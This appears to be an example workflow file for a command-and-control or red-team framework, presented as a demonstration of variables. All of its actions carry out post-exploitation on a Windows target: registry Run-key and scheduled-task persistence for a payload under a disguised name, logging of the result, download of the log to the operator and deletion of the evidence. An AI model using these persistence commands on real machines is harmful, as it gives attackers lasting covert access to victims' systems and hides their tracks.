name: Variables Example Workflow
# Demonstrates workflow variable usage for reusable values

variables:
  # User and system configuration
  target_user: "bill"
  target_computer: "MyPC"

  # Payload configuration
  payload_path: "C:\\mypayload.exe"

  # Persistence configuration
  persistence_name: "GoodName"
  persistence_description: "Important Info"

  # Audit and logging
  audit_dir: "C:\\Windows\\Temp\\Audits"
  log_file: "audit_log.txt"

actions:
  # Demonstrate variable usage in echo command
  - name: show_variables
    type: shell
    parameters:
      command: |
        echo Target User: ${target_user}
        echo Target Computer: ${target_computer}
        echo Persistence Name: ${persistence_name}

  # Create audit directory using variable
  - name: create_audit_dir
    type: shell
    parameters:
      command: 'if not exist "${audit_dir}" mkdir "${audit_dir}"'

  # Registry-based persistence using variables
  - name: persistence_registry
    type: shell
    parameters:
      command: 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${persistence_name}" /t REG_EXPAND_SZ /f /d "${payload_path}"'
    on_success:
      - name: verify_registry
        type: shell
        parameters:
          command: 'REG QUERY "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${persistence_name}"'

  # Scheduled task persistence using variables
  - name: persistence_schtask
    type: shell
    all_of:
      - source: beacon.isAdmin
        operator: equals
        value: "true"
    parameters:
      command: 'schtasks /create /tn "${persistence_name}" /tr "${payload_path}" /sc daily /f'
    on_success:
      - name: verify_schtask
        type: shell
        parameters:
          command: 'schtasks /query /tn "${persistence_name}"'

  # Log results to audit directory
  - name: log_results
    type: shell
    parameters:
      command: |
        echo [%DATE% %TIME%] Persistence established: ${persistence_name} > "${audit_dir}\\${log_file}"
        echo Payload: ${payload_path} >> "${audit_dir}\\${log_file}"
        echo Target: ${target_computer}\\${target_user} >> "${audit_dir}\\${log_file}"

  # Download audit log
  - name: download_audit
    type: download
    parameters:
      remote_path: "${audit_dir}\\${log_file}"

  # Cleanup (optional)
  - name: cleanup_audit
    type: shell
    parameters:
      command: 'del "${audit_dir}\\${log_file}"'
